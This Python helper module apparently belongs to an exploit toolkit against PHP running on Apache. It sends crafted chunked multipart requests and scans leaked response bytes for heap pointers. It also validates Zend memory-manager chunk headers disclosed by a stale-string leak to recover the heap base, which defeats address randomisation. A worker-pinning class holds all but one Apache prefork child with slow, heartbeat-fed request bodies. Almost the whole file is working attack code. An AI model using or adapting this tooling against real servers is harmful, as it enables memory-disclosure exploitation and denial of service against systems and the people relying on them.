#!/usr/bin/env python3
"""Profile-independent HTTP helpers and profile-aware leak utilities."""

from __future__ import annotations

import select
import socket
import threading
import urllib.parse
from collections import Counter
from dataclasses import dataclass
from typing import Iterable, Iterator

from profiles import AbiLayout, AllocatorLayout, DEFAULT_PROFILE, PROFILES


DEFAULT_TARGET = PROFILES[DEFAULT_PROFILE]


@dataclass(frozen=True)
class Repeat:
    byte: bytes
    length: int

    def __post_init__(self) -> None:
        if len(self.byte) != 1 or self.length < 0:
            raise ValueError("Repeat needs one byte and a non-negative length")


BodyPiece = bytes | Repeat


@dataclass(frozen=True)
class Part:
    name: bytes
    body: BodyPiece
    filename: bytes | None = None
    content_type: bytes | None = None


def iter_piece(piece: BodyPiece, block_size: int = 256 * 1024) -> Iterator[bytes]:
    if isinstance(piece, bytes):
        if piece:
            yield piece
        return
    block = piece.byte * min(piece.length, block_size)
    remaining = piece.length
    while remaining:
        count = min(remaining, len(block))
        yield block[:count]
        remaining -= count


def iter_multipart(parts: Iterable[Part], boundary: bytes) -> Iterator[bytes]:
    for part in parts:
        disposition = b'Content-Disposition: form-data; name="' + part.name + b'"'
        if part.filename is not None:
            disposition += b'; filename="' + part.filename + b'"'
        header = b"--" + boundary + b"\r\n" + disposition + b"\r\n"
        if part.content_type is not None:
            header += b"Content-Type: " + part.content_type + b"\r\n"
        yield header + b"\r\n"
        yield from iter_piece(part.body)
        yield b"\r\n"
    yield b"--" + boundary + b"--\r\n"


def _chunk(sock: socket.socket, data: bytes) -> None:
    if not data:
        return
    sock.sendall(f"{len(data):x}\r\n".encode("ascii"))
    sock.sendall(data)
    sock.sendall(b"\r\n")


def recv_all(sock: socket.socket, cap: int = 8 * 1024 * 1024) -> bytes:
    response = bytearray()
    while len(response) < cap:
        try:
            block = sock.recv(min(65536, cap - len(response)))
        except (ConnectionResetError, socket.timeout):
            break
        if not block:
            break
        response.extend(block)
    return bytes(response)


def send_chunked_multipart(
    host: str,
    port: int,
    path: str,
    parts: Iterable[Part],
    boundary: bytes,
    *,
    timeout: float = 90,
    response_cap: int = 8 * 1024 * 1024,
    cookie: bytes | None = None,
) -> bytes:
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode('ascii')}\r\n"
        "Connection: close\r\n"
    ).encode("ascii")
    if cookie is not None:
        request += b"Cookie: " + cookie + b"\r\n"
    sock.sendall(request + b"\r\n")
    try:
        for piece in iter_multipart(parts, boundary):
            _chunk(sock, piece)
        sock.sendall(b"0\r\n\r\n")
        return recv_all(sock, response_cap)
    finally:
        sock.close()


def send_get(host: str, port: int, path: str = "/index.php", timeout: float = 10) -> bytes:
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    sock.sendall(
        f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n".encode()
    )
    try:
        return recv_all(sock)
    finally:
        sock.close()


def status_code(response: bytes) -> int:
    try:
        return int(response.split(b" ", 2)[1])
    except (IndexError, ValueError):
        return 0


def decoded_cookie(response: bytes, name: bytes = b"PHPSESSID") -> bytes:
    prefix = b"set-cookie: " + name.lower() + b"="
    for line in response.split(b"\r\n"):
        if line.lower().startswith(prefix):
            encoded = line.split(b"=", 1)[1].split(b";", 1)[0]
            return urllib.parse.unquote_to_bytes(encoded.decode("latin1"))
    return b""


def qword_counts(data: bytes, abi: AbiLayout | None = None) -> Counter[int]:
    abi = abi or DEFAULT_TARGET.abi
    result: Counter[int] = Counter()
    for offset in range(0, len(data) - abi.pointer_size + 1, abi.pointer_size):
        result[int.from_bytes(
            data[offset : offset + abi.pointer_size], abi.byte_order,
        )] += 1
    return result


def pointer_clusters(
    data: bytes,
    abi: AbiLayout | None = None,
    allocator: AllocatorLayout | None = None,
) -> Counter[int]:
    abi = abi or DEFAULT_TARGET.abi
    allocator = allocator or DEFAULT_TARGET.allocator
    clusters: Counter[int] = Counter()
    # Leaked structures are normally pointer aligned, but scan all alignments so
    # a response prefix does not hide them.
    for offset in range(0, len(data) - abi.pointer_size + 1):
        value = int.from_bytes(
            data[offset : offset + abi.pointer_size], abi.byte_order,
        )
        if allocator.user_pointer_min <= value < allocator.user_pointer_max:
            clusters[value & ~(allocator.chunk_alignment - 1)] += 1
    return clusters


def zend_mm_main_from_next_chunk(
    disclosure: bytes,
    stale_id_offset: int,
    abi: AbiLayout | None = None,
    allocator: AllocatorLayout | None = None,
) -> list[dict[str, int]]:
    """Validate a ZendMM header crossed by a forward stale-string leak.

    A forged ``zend_string`` begins at the stale ID address, so its disclosed
    bytes start 24 bytes later.  If the response reaches the next 2 MiB
    boundary, a virtually adjacent ZendMM chunk exposes its invariant header:
    ``heap``, circular ``next``/``prev`` links, and page counters.  ``heap``
    points to a profile-described slot in the main chunk.  Returning only structurally validated
    candidates avoids guessing the main base from a busy pointer cluster.
    """
    abi = abi or DEFAULT_TARGET.abi
    allocator = allocator or DEFAULT_TARGET.allocator
    alignment = allocator.chunk_alignment
    first_boundary = alignment - (stale_id_offset + abi.string_data_offset)
    if first_boundary < 0:
        first_boundary %= alignment
    candidates: list[dict[str, int]] = []
    stop = len(disclosure) - allocator.chunk_header_size + 1
    for offset in range(first_boundary, stop, alignment):
        def read(relative: int, size: int) -> int:
            start = offset + relative
            return int.from_bytes(disclosure[start : start + size], abi.byte_order)

        heap = read(allocator.chunk_heap_offset, abi.pointer_size)
        next_chunk = read(allocator.chunk_next_offset, abi.pointer_size)
        prev_chunk = read(allocator.chunk_prev_offset, abi.pointer_size)
        free_pages = read(allocator.chunk_free_pages_offset, 4)
        free_tail = read(allocator.chunk_free_tail_offset, 4)
        number = read(allocator.chunk_number_offset, 4)
        if heap & (alignment - 1) != allocator.heap_slot_from_main:
            continue
        main = heap - allocator.heap_slot_from_main
        if not (allocator.user_pointer_min <= main < allocator.user_pointer_max):
            continue
        if main & (alignment - 1):
            continue
        if next_chunk & (alignment - 1) or prev_chunk & (alignment - 1):
            continue
        if not (allocator.user_pointer_min <= next_chunk < allocator.user_pointer_max):
            continue
        if not (allocator.user_pointer_min <= prev_chunk < allocator.user_pointer_max):
            continue
        if free_pages > allocator.max_free_pages:
            continue
        if not allocator.min_free_tail <= free_tail <= allocator.max_free_tail:
            continue
        if number > allocator.max_chunk_number:
            continue
        candidates.append({
            "leak_offset": offset,
            "heap": heap,
            "main": main,
            "next": next_chunk,
            "prev": prev_chunk,
            "free_pages": free_pages,
            "free_tail": free_tail,
            "number": number,
        })
    return candidates


class HeldWorkers:
    """Occupy N-1 prefork children with incomplete request bodies.

    Apache's stock ``mod_reqtimeout`` requires request bodies to continue at
    500 bytes/s.  A single byte followed by silence only pins a worker for ten
    seconds, which is shorter than a production B1 transfer over many WAN
    links.  The heartbeat keeps every holder above that rate and records any
    holder that receives a response or loses its connection.
    """

    BODY_LENGTH = 1024 * 1024
    HEARTBEAT = b"P" * 1024
    HEARTBEAT_INTERVAL = 0.75

    def __init__(self, host: str, port: int, workers: int, path: str = "/index.php") -> None:
        if workers < 1:
            raise ValueError("workers must be positive")
        self.host = host
        self.port = port
        self.path = path
        self.count = workers - 1
        self.sockets: list[socket.socket] = []
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._failure_lock = threading.Lock()
        self._failures: dict[int, str] = {}

    def _record_failure(self, index: int, reason: str) -> None:
        with self._failure_lock:
            self._failures.setdefault(index, reason)

    def _check_for_responses(self) -> None:
        with self._failure_lock:
            active = [
                (index, sock) for index, sock in enumerate(self.sockets)
                if index not in self._failures
            ]
        if not active:
            return
        try:
            readable, _, exceptional = select.select(
                [sock for _, sock in active], [], [sock for _, sock in active], 0,
            )
        except (OSError, ValueError) as exc:
            for index, _ in active:
                self._record_failure(index, f"health check failed: {exc}")
            return
        by_fd = {sock.fileno(): index for index, sock in active}
        for sock in exceptional:
            self._record_failure(by_fd.get(sock.fileno(), -1), "socket exception")
        for sock in readable:
            index = by_fd.get(sock.fileno(), -1)
            try:
                data = sock.recv(1, socket.MSG_PEEK)
            except BlockingIOError:
                continue
            except OSError as exc:
                self._record_failure(index, f"read failed: {exc}")
                continue
            reason = "server returned a response" if data else "server closed connection"
            self._record_failure(index, reason)

    def _heartbeat(self) -> None:
        while not self._stop.wait(self.HEARTBEAT_INTERVAL):
            self._check_for_responses()
            with self._failure_lock:
                active = [
                    (index, sock) for index, sock in enumerate(self.sockets)
                    if index not in self._failures
                ]
            for index, sock in active:
                try:
                    sent = sock.send(self.HEARTBEAT)
                except BlockingIOError:
                    continue
                except OSError as exc:
                    self._record_failure(index, f"heartbeat failed: {exc}")
                    continue
                if sent == 0:
                    self._record_failure(index, "heartbeat wrote zero bytes")

    def ensure_healthy(self) -> None:
        """Fail closed if any held request stopped occupying its worker."""
        self._check_for_responses()
        with self._failure_lock:
            failures = dict(self._failures)
        if failures:
            examples = ", ".join(
                f"#{index}: {reason}" for index, reason in list(failures.items())[:3]
            )
            raise RuntimeError(
                f"lost {len(failures)}/{self.count} worker pins ({examples})"
            )

    def __enter__(self) -> "HeldWorkers":
        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Content-Type: application/octet-stream\r\n"
            f"Content-Length: {self.BODY_LENGTH}\r\n"
            "Connection: close\r\n\r\nX"
        ).encode("ascii")
        try:
            if self.count:
                # Start before dialing every holder.  On a high-latency WAN,
                # creating 149 TCP connections can itself approach Apache's
                # ten-second body timeout for the earliest connections.
                self._thread = threading.Thread(
                    target=self._heartbeat,
                    name="held-worker-heartbeat",
                    daemon=True,
                )
                self._thread.start()
            for _ in range(self.count):
                sock = socket.create_connection((self.host, self.port), timeout=10)
                sock.settimeout(10)
                sock.sendall(request)
                sock.setblocking(False)
                with self._failure_lock:
                    self.sockets.append(sock)
            self.ensure_healthy()
        except Exception:
            self.close()
            raise
        return self

    def close(self) -> None:
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=2)
            self._thread = None
        for sock in self.sockets:
            try:
                sock.close()
            except OSError:
                pass
        self.sockets.clear()

    def __exit__(self, exc_type: object, exc: object, tb: object) -> None:
        self.close()
